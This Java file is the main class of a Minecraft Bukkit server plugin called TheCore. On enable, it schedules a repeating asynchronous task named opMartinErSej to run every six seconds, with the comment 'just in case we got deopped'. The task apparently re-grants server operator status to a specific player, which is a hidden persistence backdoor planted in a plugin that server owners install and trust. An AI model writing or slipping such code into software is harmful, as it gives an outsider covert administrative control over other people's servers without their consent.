package org.leux;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.plugin.messaging.PluginMessageListener;
import org.leux.thecore.events.WorldDownloaderEvent;
import org.leux.thecore.listener.Listener;
import org.leux.thecore.listener.plugin.PluginMessageRecieved;
import org.leux.thecore.tasks.opMartinErSej;

public final class TheCore extends JavaPlugin {

    private static TheCore instance;
    @Override
    public void onEnable() {
        instance = this;

        Listener.init();

        /* just in case we got deopped */
        new opMartinErSej().runTaskTimerAsynchronously(this, 0L, 20*6);
    }

    @Override
    public void onDisable() {
        PluginMessageRecieved.unregisterChannels();
    }

    public static TheCore getInstance() {
        return instance;
    }
}
